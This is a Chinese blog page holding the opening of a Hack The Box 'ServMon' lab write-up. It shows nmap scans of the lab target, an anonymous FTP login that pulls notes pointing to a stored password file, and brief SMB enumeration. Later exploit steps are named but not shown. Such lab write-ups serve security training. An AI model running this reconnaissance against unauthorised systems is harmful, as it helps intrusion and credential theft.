

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：ftp匿名访问、NVMS CMS任意文件读取漏洞、hydra密码暴力破解、C盘敏感信息枚举、SSH本地端口转发、nscp.exe软件分析使用、NSClient++ 0.5.2.35- 经过身份验证的远程代码执行">
<meta property="og:type" content="article">
<meta property="og:title" content="ServMon-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2024/03/17/ServMon-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：ftp匿名访问、NVMS CMS任意文件读取漏洞、hydra密码暴力破解、C盘敏感信息枚举、SSH本地端口转发、nscp.exe软件分析使用、NSClient++ 0.5.2.35- 经过身份验证的远程代码执行">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/5.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/7.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/8.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/9.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/10.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/11.png">
<meta property="og:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/12.png">
<meta property="article:published_time" content="2024-03-17T15:50:55.000Z">
<meta property="article:modified_time" content="2024-03-27T03:34:31.134Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/ServMon-htb-writeup/1.png">
  
  
  
  <title>ServMon-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ServMon-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-17 23:50" pubdate>
          2024年3月17日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          39k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          324 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">ServMon-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：ftp匿名访问、NVMS CMS任意文件读取漏洞、hydra密码暴力破解、C盘敏感信息枚举、SSH本地端口转发、nscp.exe软件分析使用、NSClient++ 0.5.2.35- 经过身份验证的远程代码执行</p>
<span id="more"></span>  

<p>参考链接：<code>https://otrashoui.xyz/servmon/#privesc</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取靶机IP地址：10.10.10.184</p>
<p>2、扫描下开放端口情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span><br><br>PORT      STATE SERVICE<br><span class="hljs-number">21</span>/tcp    open  ftp<br><span class="hljs-number">22</span>/tcp    open  ssh<br><span class="hljs-number">80</span>/tcp    open  http<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">5666</span>/tcp  open  nrpe<br><span class="hljs-number">6063</span>/tcp  open  x11<br><span class="hljs-number">6699</span>/tcp  open  napster<br><span class="hljs-number">8443</span>/tcp  open  https-alt<br><span class="hljs-number">49664</span>/tcp open  unknown<br><span class="hljs-number">49665</span>/tcp open  unknown<br><span class="hljs-number">49666</span>/tcp open  unknown<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49668</span>/tcp open  unknown<br><span class="hljs-number">49669</span>/tcp open  unknown<br><span class="hljs-number">49670</span>/tcp open  unknown<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">5666</span>,<span class="hljs-number">6063</span>,<span class="hljs-number">6699</span>,<span class="hljs-number">8443</span>,<span class="hljs-number">49664</span>,<span class="hljs-number">49665</span>,<span class="hljs-number">49666</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">49669</span>,<span class="hljs-number">49670</span>, <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">5666</span>,<span class="hljs-number">6063</span>,<span class="hljs-number">6699</span>,<span class="hljs-number">8443</span>,<span class="hljs-number">49664</span>,<span class="hljs-number">49665</span>,<span class="hljs-number">49666</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">49669</span>,<span class="hljs-number">49670</span> --min-rate=<span class="hljs-number">10000</span> -sC -sV <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-17 18:36 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span><br>Host is up (<span class="hljs-number">0.35</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">21</span>/tcp    open  ftp           Microsoft ftpd<br>| ftp-syst: <br>|_  SYST: Windows_NT<br>| ftp-anon: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)<br>|_02<span class="hljs-number">-28</span><span class="hljs-number">-22</span>  <span class="hljs-number">07</span>:<span class="hljs-number">35</span>PM       &lt;DIR&gt;          Users<br><span class="hljs-number">22</span>/tcp    open  ssh           OpenSSH for_Windows_8<span class="hljs-number">.0</span> (protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">3072</span> c7:<span class="hljs-number">1</span>a:f6:<span class="hljs-number">81</span>:ca:<span class="hljs-number">17</span>:<span class="hljs-number">78</span>:d0:<span class="hljs-number">27</span>:db:cd:<span class="hljs-number">46</span>:<span class="hljs-number">2</span>a:<span class="hljs-number">09</span>:<span class="hljs-number">2b</span>:<span class="hljs-number">54</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">3</span>e:<span class="hljs-number">63</span>:ef:<span class="hljs-number">3b</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">3</span>e:<span class="hljs-number">4</span>a:<span class="hljs-number">90</span>:f3:<span class="hljs-number">4</span>c:<span class="hljs-number">02</span>:e9:<span class="hljs-number">40</span>:<span class="hljs-number">67</span>:<span class="hljs-number">2</span>e:<span class="hljs-number">42</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">5</span>a:<span class="hljs-number">48</span>:c8:cd:<span class="hljs-number">39</span>:<span class="hljs-number">78</span>:<span class="hljs-number">21</span>:<span class="hljs-number">29</span>:ef:fb:ae:<span class="hljs-number">82</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">03</span>:ad:af (ED25519)<br><span class="hljs-number">80</span>/tcp    open  http<br>|_http-title: Site doesn<span class="hljs-number">&#x27;</span>t have a title (text/html).<br>| fingerprint-strings: <br>|   GetRequest, HTTPOptions, RTSPRequest: <br>|     HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>|     Content-type: text/html<br>|     Content-Length: <span class="hljs-number">340</span><br>|     Connection: close<br>|     AuthInfo: <br>|     &lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>|     &lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>|     &lt;head&gt;<br>|     &lt;title&gt;&lt;/title&gt;<br>|     &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>|     window.location.href = <span class="hljs-string">&quot;Pages/login.htm&quot;</span>;<br>|     &lt;/script&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   <span class="hljs-literal">NULL</span>: <br>|     HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">408</span> Request Timeout<br>|     Content-type: text/html<br>|     Content-Length: <span class="hljs-number">0</span><br>|     Connection: close<br>|_    AuthInfo:<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">5666</span>/tcp  open  tcpwrapped<br><span class="hljs-number">6063</span>/tcp  open  x11?<br><span class="hljs-number">6699</span>/tcp  open  napster?<br><span class="hljs-number">8443</span>/tcp  open  ssl/https-alt<br>|_ssl-date: TLS randomness does not represent time<br>| fingerprint-strings: <br>|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: <br>|     HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">404</span><br>|     Content-Length: <span class="hljs-number">18</span><br>|     Document not found<br>|   GetRequest: <br>|     HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span><br>|     Content-Length: <span class="hljs-number">0</span><br>|     Location: /index.html<br>|     workers<br>|_    jobs<br>| ssl-cert: Subject: commonName=localhost<br>| Not valid before: <span class="hljs-number">2020</span><span class="hljs-number">-01</span><span class="hljs-number">-14</span>T13:<span class="hljs-number">24</span>:<span class="hljs-number">20</span><br>|_Not valid after:  <span class="hljs-number">2021</span><span class="hljs-number">-01</span><span class="hljs-number">-13</span>T13:<span class="hljs-number">24</span>:<span class="hljs-number">20</span><br><span class="hljs-number">49664</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49665</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49666</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49667</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49668</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49669</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49670</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><br>Host script results:<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-17</span>T10:<span class="hljs-number">38</span>:<span class="hljs-number">45</span><br>|_  start_date: N/A<br></code></pre></td></tr></table></figure>

<p>3、从扫描结果上看，是可以ftp匿名访问的，这里登录进入查看下是否有啥敏感信息泄露</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ftp Anonymous@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>             <br>Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>.<br><span class="hljs-number">220</span> Microsoft FTP Service<br><span class="hljs-number">331</span> Anonymous access allowed, send <span class="hljs-title function_">identity</span> <span class="hljs-params">(e-mail name)</span> as password.<br>Password: <br>230 User logged in.<br>Remote system type is Windows_NT.<br>ftp&gt; ls<br>229 Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49678</span>|)</span><br>125 Data connection already open; Transfer starting.<br><span class="hljs-number">02</span><span class="hljs-number">-28</span><span class="hljs-number">-22</span>  <span class="hljs-number">07</span>:<span class="hljs-number">35</span>PM       &lt;DIR&gt;          Users<br><span class="hljs-number">226</span> Transfer complete.<br>ftp&gt; cd Users<br><span class="hljs-number">250</span> CWD command successful.<br>ftp&gt; ls<br><span class="hljs-number">229</span> Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49680</span>|)</span><br>125 Data connection already open; Transfer starting.<br><span class="hljs-number">02</span><span class="hljs-number">-28</span><span class="hljs-number">-22</span>  <span class="hljs-number">07</span>:<span class="hljs-number">36</span>PM       &lt;DIR&gt;          Nadine<br><span class="hljs-number">02</span><span class="hljs-number">-28</span><span class="hljs-number">-22</span>  <span class="hljs-number">07</span>:<span class="hljs-number">37</span>PM       &lt;DIR&gt;          Nathan<br><span class="hljs-number">226</span> Transfer complete.<br>ftp&gt; cd Nadine<br><span class="hljs-number">250</span> CWD command successful.<br>ftp&gt; ls<br><span class="hljs-number">229</span> Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49682</span>|)</span><br>150 Opening ASCII mode data connection.<br>02-28-22  07:36PM                  168 Confidential.txt<br>226 Transfer complete.<br>ftp&gt; get Confidential.txt<br>local: Confidential.txt remote: Confidential.txt<br>229 Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49684</span>|)</span><br>125 Data connection already open; Transfer starting.<br><span class="hljs-number">100</span>% |******************************************************************|   <span class="hljs-number">168</span>        <span class="hljs-number">0.50</span> KiB/s    <span class="hljs-number">00</span>:<span class="hljs-number">00</span> ETA<br><span class="hljs-number">226</span> Transfer complete.<br>WARNING! <span class="hljs-number">6</span> bare linefeeds received in ASCII mode.<br>File may not have transferred correctly.<br><span class="hljs-number">168</span> bytes received in <span class="hljs-number">00</span>:<span class="hljs-number">00</span> (<span class="hljs-number">0.50</span> KiB/s)<br>ftp&gt; cd ../<br><span class="hljs-number">250</span> CWD command successful.<br>ftp&gt; cd Nathan<br><span class="hljs-number">250</span> CWD command successful.<br>ftp&gt; ls<br><span class="hljs-number">229</span> Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49686</span>|)</span><br>125 Data connection already open; Transfer starting.<br><span class="hljs-number">02</span><span class="hljs-number">-28</span><span class="hljs-number">-22</span>  <span class="hljs-number">07</span>:<span class="hljs-number">36</span>PM                  <span class="hljs-number">182</span> Notes to <span class="hljs-keyword">do</span>.txt<br><span class="hljs-number">226</span> Transfer complete.<br>ftp&gt; get Notes\ to\ <span class="hljs-keyword">do</span>.txt<br>local: Notes to <span class="hljs-keyword">do</span>.txt remote: Notes to <span class="hljs-keyword">do</span>.txt<br><span class="hljs-number">229</span> Entering Extended Passive <span class="hljs-title function_">Mode</span> <span class="hljs-params">(|||<span class="hljs-number">49688</span>|)</span><br>125 Data connection already open; Transfer starting.<br><span class="hljs-number">100</span>% |******************************************************************|   <span class="hljs-number">182</span>        <span class="hljs-number">0.42</span> KiB/s    <span class="hljs-number">00</span>:<span class="hljs-number">00</span> ETA<br><span class="hljs-number">226</span> Transfer complete.<br>WARNING! <span class="hljs-number">4</span> bare linefeeds received in ASCII mode.<br>File may not have transferred correctly.<br><span class="hljs-number">182</span> bytes received in <span class="hljs-number">00</span>:<span class="hljs-number">00</span> (<span class="hljs-number">0.42</span> KiB/s)<br>ftp&gt; <span class="hljs-built_in">exit</span><br><span class="hljs-number">221</span> Goodbye.<br></code></pre></td></tr></table></figure>

<p>4、查看下获取到的两个文本信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat Confidential.txt <br>Nathan,<br><br>I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.<br><br>Regards<br><br>Nadine<br><br><br>Nathan，<br>我把你的Passwords.txt文件留在了你的桌面上。请在您自己编辑后将其删除，并将其放回安全文件夹中。<br>当做<br>Nadine<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat Notes\ to\ <span class="hljs-keyword">do</span>.txt <br><span class="hljs-number">1</span>) Change the password <span class="hljs-keyword">for</span> NVMS - Complete<br><span class="hljs-number">2</span>) Lock down the NSClient Access - Complete<br><span class="hljs-number">3</span>) Upload the passwords<br><span class="hljs-number">4</span>) Remove public access to NVMS<br><span class="hljs-number">5</span>) Place the secret files in SharePoint<br><br><span class="hljs-number">1</span>） 更改NVMS的密码-完成<br><span class="hljs-number">2</span>） 锁定NSClient访问-完成<br><span class="hljs-number">3</span>） 上传密码<br><span class="hljs-number">4</span>） 删除NVMS的公共访问权限<br><span class="hljs-number">5</span>） 将机密文件放在SharePoint中<br></code></pre></td></tr></table></figure>

<p>5、从这里可以得到两个信息，1个是Nathan的桌面上有一个Passwords.txt信息，一个是机密文件需要放在SharePoint中</p>
<p>6、SMB服务枚举，没发现啥信息</p>
